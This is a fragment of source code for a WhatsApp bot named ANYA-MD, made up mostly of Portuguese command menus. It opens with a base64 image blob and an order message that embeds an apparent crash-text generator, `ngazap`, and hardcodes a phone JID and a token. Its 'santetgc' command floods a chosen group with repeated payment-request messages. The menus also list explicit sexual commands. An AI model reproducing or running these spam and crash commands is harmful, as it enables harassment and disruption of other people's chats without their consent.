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",
						"itemCount": 7,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"priceAmount1000": "10000000",
						"message": `© ANYA-MD${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./lib/anya.jpg'),
"orderTitle": `© ANYA-MD${ngazap(prefix)}`,
						"sellerJid": "6285714170944@s.whatsapp.net",
						"token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",
						"totalAmount1000": "35000000",
						"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
anya.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
case 'santetgc': {
if (!isCreator) return
if (args.length < 1) return m.reply(`*Erro de sintaxe!*\n\nUse: ${command} idGroup|amount spam|timer\nExample: ${command} 62888@g.us|1|10s\n\n\ns = Segundo/Segundo\n\nTenta entrar no Grupo Bot`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/anya.jpg') }, { upload: anya.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `ANYA-MD`,
}
}}), { userJid: m.chat, quoted: doc})
anya.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
}
break
case 'menu1': {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
//const comandost = totalcmd
var Yy = 0
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()            
anyakkk = `
┌──⊰「 𝑰𝑵𝑭𝑶 𝑼𝑺𝑬𝑹 」
│
│➢ nome: ${pushname}
│➢ wame: wa.me/${m.sender.split("@s.whatsapp.net")[0]}
│➢ patente: ${role}
│
└──⊰

┌──⊰「 𝑰𝑵𝑭𝑶 𝐵𝑶𝑻 」
│
│➢ nome do bot: ${nomedobot}
│➢ nome do dono: ${nomedodono}
│➢ numero do dono: ${numerododono}
│➢ tempo ativo: ${runtime(process.uptime())}
│➢ tempo de resposta: ${latensi.toFixed(4)}
│
└──⊰


┌──⊰「 𝑮𝑹𝑼𝑷𝑶𝑺 」
│
│➢ ${prefix}promover [ _@_ ]
│➢ ${prefix}rebaixar [ _@_ ]
│➢ ${prefix}banir [ _@_ ]
│➢ ${prefix}adicionar [ _@_ ]
│➢ ${prefix}grupo [ _opção_ ]
│➢ ${prefix}listadmins
│➢ ${prefix}welcome [ _opção_ ]
│➢ ${prefix}nsfw [ _opção_ ]
│➢ ${prefix}fechargp [ _tempo_ ]
│➢ ${prefix}abrirgp [ _tempo_ ]
│➢ ${prefix}marcar
│➢ ${prefix}marcar2
│➢ ${prefix}join
│➢ ${prefix}setdesc
│➢ ${prefix}editinfo [ _opção_ ]
│➢ ${prefix}delete
│➢ ${prefix}listonline
│➢ ${prefix}setname [ _texto_ ]
│➢ ${prefix}hidetag [ _texto_ ]
│➢ ${prefix}resetlink
│➢ ${prefix}linkgp
│➢ ${prefix}wame
│➢ ${prefix}gruposetting
│➢ ${prefix}autoreact [ _opção_ ]
│➢ ${prefix}convite [ _link de gp_ ]
│➢ ${prefix}dontback
│➢ ${prefix}dbackadd [ _55xxxxx_ ]
│➢ ${prefix}dbackrm [ _55xxxxx_ ]
│➢ ${prefix}gpinfo
│
├──⊰「 𝑨𝑵𝑻𝑰𝑺 」
│
│➢ ${prefix}antifake [ _opção_ ]
│➢ ${prefix}antiimg [ _opção_ ]
│➢ ${prefix}antidoc [ _opção_ ]
│➢ ${prefix}antilink [ _opção_ ]
│➢ ${prefix}antiviewonce [ _opção_ ]
│➢ ${prefix}limiteflood [ _opção_ ]
│➢ ${prefix}limitec [ _quantidade_ ]
│
├──⊰「 𝑪𝑶𝑵𝑽𝑬𝑹𝑻𝑬𝑹 」
│
│➢ ${prefix}toimage
│➢ ${prefix}sticker
│➢ ${prefix}togif
│➢ ${prefix}tomp3
│➢ ${prefix}tourl
│➢ ${prefix}tovideo
│➢ ${prefix}tinyurl
│➢ ${prefix}readmore
│➢ ${prefix}emojimix [ _😈+😍_ ]
│➢ ${prefix}emojimix2 [ _😈_ ]
│➢ ${prefix}reagir [ _emoji_ ]
│➢ ${prefix}tts pt [ _txt_ ]
│
├──⊰「 𝑭𝑰𝑮𝑼𝑹𝑰𝑵𝑯𝐴𝑺 」
│
│➢ ${prefix}figuanime
│➢ ${prefix}figudecria
│➢ ${prefix}figujapinha
│➢ ${prefix}figumagago
│➢ ${prefix}figuemoji
│➢ ${prefix}figumeme
│
├──⊰「 𝑷𝑬𝑺𝑸𝑼𝑰𝑺𝐴/𝑫𝑶𝑾𝑵𝑳𝑶𝑨𝑫 」
│
│➢ ${prefix}pinterest [ _nome_ ]
│➢ ${prefix}stickersearch [ _nome_ ]
│➢ ${prefix}anime [ _nome_ ]
│➢ ${prefix}wikipedia [ _pesquisa_ ]
│➢ ${prefix}play [ _nome da msc_ ]
│➢ ${prefix}play2 [ _nome da msc_ ]
│➢ ${prefix}ytmp3 [ _link da msc_ ]
│➢ ${prefix}ytmp4 [ _link da msc_ ]
│➢ ${prefix}tiktok [ _link_ ]
│➢ ${prefix}igreel [ _link_ ]
│➢ ${prefix}igdl [ _link_ ]
│➢ ${prefix}facebook [ _link_ ]
│➢ ${prefix}fbmp3 [ _link_ ]
│➢ ${prefix}metadinha
│➢ ${prefix}nick [ _nome_ ]
│➢ ${prefix}gimage [ _nome_ ]
│➢ ${prefix}lirik [ _nome da msc_ ]
│➢ ${prefix}mediafire [ _link_ ]
│➢ ${prefix}covid
│
├──⊰「 𝑫𝑰𝑽𝑬𝑹𝑺𝐴𝑶 」
│
│➢ ${prefix}akinator
│➢ ${prefix}jogodaforca [ _1/0_ ]
│➢ ${prefix}quando
│➢ ${prefix}morte
│➢ ${prefix}pau
│➢ ${prefix}gay
│➢ ${prefix}chance
│➢ ${prefix}gostoso
│➢ ${prefix}sn
│➢ ${prefix}gadometro
│➢ ${prefix}rr
│➢ ${prefix}dado
│➢ ${prefix}caracoroa
│➢ ${prefix}diga [ _texto_ ]
│➢ ${prefix}fordward [ _texto_ ]
│➢ ${prefix}contar [ _texto_ ]
│➢ ${prefix}tagme
│➢ ${prefix}slot
│➢ ${prefix}amongus [ _@_ ]
│➢ ${prefix}abraço [ _@_ ]
│➢ ${prefix}beijo [ _@_ ]
│➢ ${prefix}perfil
│➢ ${prefix}anagrama [ _1/0_ ]
│
├──⊰「 𝐴𝑳𝑻𝑬𝑹𝐴𝑫𝑶𝑹𝑬𝑺 」
│
│➢ ${prefix}bass [ _marque o áudio_ ]
│➢ ${prefix}blown [ _marque o áudio_ ]
│➢ ${prefix}deep [ _marque o áudio_ ]
│➢ ${prefix}earrape [ _marque o áudio_ ]
│➢ ${prefix}fast [ _marque o áudio_ ] 
│➢ ${prefix}fat [ _marque o áudio_ ]
│➢ ${prefix}nightcore [ _marque o áudio_ ]
│➢ ${prefix}reverse [ _marque o áudio_ ] 
│➢ ${prefix}robot [ _marque o áudio_ ]
│➢ ${prefix}slow [ _marque o áudio_ ]
│➢ ${prefix}smooth [ _marque o áudio_ ] 
│➢ ${prefix}tupai [ _marque o áudio_ ]
│
├──⊰「 _+𝟏𝟖_ 」
│
│➢ ${prefix}tentacles
│➢ ${prefix}yuri
│➢ ${prefix}thighs
│➢ ${prefix}bdsm
│➢ ${prefix}foot
│➢ ${prefix}gangbang
│➢ ${prefix}blowjob
│➢ ${prefix}pussy
│➢ ${prefix}panties
│➢ ${prefix}cuckold
│➢ ${prefix}orgy
│➢ ${prefix}ero
│➢ ${prefix}ass
│➢ ${prefix}cum
│➢ ${prefix}ahegao
│➢ ${prefix}femdom
│➢ ${prefix}glasses
│➢ ${prefix}hentai
│➢ ${prefix}jahy
│➢ ${prefix}masturbation
│
├──⊰「 𝑳𝑶𝑮𝑶𝑺 」
│
│➢ ${prefix}matrix [ _nome_ ]
│➢ ${prefix}gluetext [ _nome_ ]
│➢ ${prefix}natural [ _nome_ ]
│➢ ${prefix}firework [ _nome_ ]
│➢ ${prefix}dropwater [ _nome_ ]
│➢ ${prefix}foggywindows [ _nome_ ]
│➢ ${prefix}neondevil [ _nome_ ]
│➢ ${prefix}christmas [ _nome_ ]
│➢ ${prefix}3dgradient [ _nome_ ]
│➢ ${prefix}blackpink [ _nome_ ]
│➢ ${prefix}harrypotter [ _nome_ ]
│➢ ${prefix}magma [ _nome_ ]
│➢ ${prefix}berry [ _nome_ ]
│➢ ${prefix}thunder [ _nome_ ]
│➢ ${prefix}transformer [ _nome_ ]
│➢ ${prefix}metallic [ _nome_ ]
│➢ ${prefix}sketch [ _nome_ ]
│➢ ${prefix}fiction [ _nome_ ]
│➢ ${prefix}greenhorror [ _nome_ ]
│➢ ${prefix}space [ _nome_ ]
│➢ ${prefix}halloween [ _nome_ ]
│
├──⊰「 𝑬𝑭𝑬𝑰𝑻𝑶 𝑰𝑴𝑮 」
│
│➢ ${prefix}jail
│➢ ${prefix}wanted 
│➢ ${prefix}ytcomment
│➢ ${prefix}fotojatoh
│➢ ${prefix}shit
│➢ ${prefix}beautiful
│➢ ${prefix}pixelate
│➢ ${prefix}blur
│➢ ${prefix}triggeredwebp
│➢ ${prefix}imagesketch
│➢ ${prefix}rip
│➢ ${prefix}dell
│➢ ${prefix}invert
│
├──⊰「 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 」
│
│➢ ${prefix}sair
│➢ ${prefix}setpp
│➢ ${prefix}bloquear [ _@_ ]
│➢ ${prefix}desbloquear [ _@_ ]
│➢ ${prefix}blockcmd [ _cmd_ ]
│➢ ${prefix}unblockcmd [ _cmd_ ]
│➢ ${prefix}listblockcmd
│➢ ${prefix}bcall
│➢ ${prefix}chatinfo
│➢ ${prefix}javolto [ _tempo_ ]
│➢ ${prefix}antipv [ _opção_ ]
│➢ ${prefix}setexif
│➢ ${prefix}setreply
│➢ ${prefix}setfooter
│➢ ${prefix}enquete [ _título|nome1|nome2_ ]
│➢ ${prefix}addcriador [ _55xxxxx_ ]
│➢ ${prefix}delcriador [ _55xxxxx_]
│➢ ${prefix}listacriador
│➢ ${prefix}addrespon [ _pergunta|resposta_ ]
│➢ ${prefix}delrespon [ _nome_ ]
│➢ ${prefix}listrespon
│➢ ${prefix}criargp
│
└──⊰ _*${nomedobot}*_`
let buttons = [
                    {buttonId: `${prefix}ativos`, buttonText: {displayText: `[📍] 𝑺𝑻𝐴𝑻𝑼𝑺 [📍]`}, type: 1},
                    {buttonId: `${prefix}ping`, buttonText: {displayText: `[⚡] 𝑽𝑬𝑳𝑶𝑪𝑰𝑫𝐴𝑫𝑬 [⚡]`}, type: 1},
                    {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                ]
                let buttonMessage = {
                   // document: fs.readFileSync(`./lib/tes.xlsx`),
                    document: fs.readFileSync('./lib/fake.pdf'),
fileName : `Olá ${pushname}`,
  caption: anyakkk,
  footer: watermark,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
  title: `${nomedobot}`,
  body: 'Me siga no Instagram', 
  showAdAttribution: true,
  thumbnail: img,
  mediaType: 2,
  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
  }}
  }
 anya.sendMessage(m.chat, buttonMessage, {quoted: m})
  }           
            break       
            case 'menugp': {
            
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
loune = `
┌──⊰「 𝑮𝑹𝑼𝑷𝑶𝑺 」
│
│➢ ${prefix}promover [ _@_ ]
│➢ ${prefix}rebaixar [ _@_ ]
│➢ ${prefix}banir [ _@_ ]
│➢ ${prefix}adicionar [ _@_ ]
│➢ ${prefix}grupo [ _opção_ ]
│➢ ${prefix}listadmins
│➢ ${prefix}welcome [ _opção_ ]
│➢ ${prefix}nsfw [ _opção_ ]
│➢ ${prefix}fechargp [ _tempo_ ]
│➢ ${prefix}abrirgp [ _tempo_ ]
│➢ ${prefix}marcar
│➢ ${prefix}marcar2
│➢ ${prefix}join
│➢ ${prefix}setdesc
│➢ ${prefix}editinfo [ _opção_ ]
│➢ ${prefix}delete
│➢ ${prefix}listonline
│➢ ${prefix}setname [ _texto_ ]
│➢ ${prefix}hidetag [ _texto_ ]
│➢ ${prefix}resetlink
│➢ ${prefix}linkgp
│➢ ${prefix}wame
│➢ ${prefix}gruposetting
│➢ ${prefix}autoreact [ _opção_ ]
│➢ ${prefix}convite [ _link de gp_ ]
│➢ ${prefix}dontback
│➢ ${prefix}dbackadd [ _55xxxxx_ ]
│➢ ${prefix}dbackrm [ _55xxxxx_ ]
│➢ ${prefix}gpinfo
│
├──⊰「 𝑨𝑵𝑻𝑰𝑺 」
│
│➢ ${prefix}antifake [ _opção_ ]
│➢ ${prefix}antiimg [ _opção_ ]
│➢ ${prefix}antidoc [ _opção_ ]
│➢ ${prefix}antilink [ _opção_ ]
│➢ ${prefix}antiviewonce [ _opção_ ]
│➢ ${prefix}limiteflood [ _opção_ ]
│➢ ${prefix}limitec [ _quantidade_ ]
│
└──⊰ _*${nomedobot}*_`
            let buttons = [
                    {buttonId: `${prefix}ativos`, buttonText: {displayText: `[📍] 𝑺𝑻𝐴𝑻𝑼𝑺 [📍]`}, type: 1},
                    {buttonId: `${prefix}ping`, buttonText: {displayText: `[⚡] 𝑽𝑬𝑳𝑶𝑪𝑰𝑫𝐴𝑫𝑬 [⚡]`}, type: 1},
                    {buttonId: `${prefix}owner`, buttonText: {displayText: `[💪🏻] 𝑪𝑹𝑰𝐴𝑫𝑶𝑹 [💪🏻]`}, type: 1}
                ]
                let buttonMessage = {
                    document: fs.readFileSync('./lib/fake.pdf'),
fileName : `Olá ${pushname}`,
caption: loune,
footer: watermark,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
  title: `${nomedobot}`,
  body: 'Me siga no Instagram', 
  showAdAttribution: true,
  thumbnail: img,
  mediaType: 2,
  mediaUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`,
  sourceUrl: `https://www.instagram.com/invites/contact/?i=yjzrurmqfk8k&utm_content=dhdwyi8`
  }}
  }
 anya.sendMessage(m.chat, buttonMessage, {quoted: m})
  }           
            break
case 'menuconverter': {

if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
alone22 = `
┌──⊰「 𝑪𝑶𝑵𝑽𝑬𝑹𝑻𝑬𝑹 」
│
│➢ ${prefix}toimage
│➢ ${prefix}sticker
│➢ ${prefix}togif
│➢ ${prefix}tomp3
│➢ ${prefix}tourl
│➢ ${prefix}tovideo
│➢ ${prefix}tinyurl
│➢ ${prefix}readmore
│➢ ${prefix}emojimix [ _😈+😍_ ]
│➢ ${prefix}emojimix2 [ _😈_ ]
│➢ ${prefix}reagir [ _emoji_ ]
│➢ ${prefix}tts pt [ _txt_ ]
│
└──⊰ _*${nomedobot}*_`
let buttons = [
                    {buttonId: `${prefix}ativos`, buttonText: {displayText: `[📍] 𝑺𝑻𝐴𝑻𝑼𝑺 [📍]`}, type: 1},
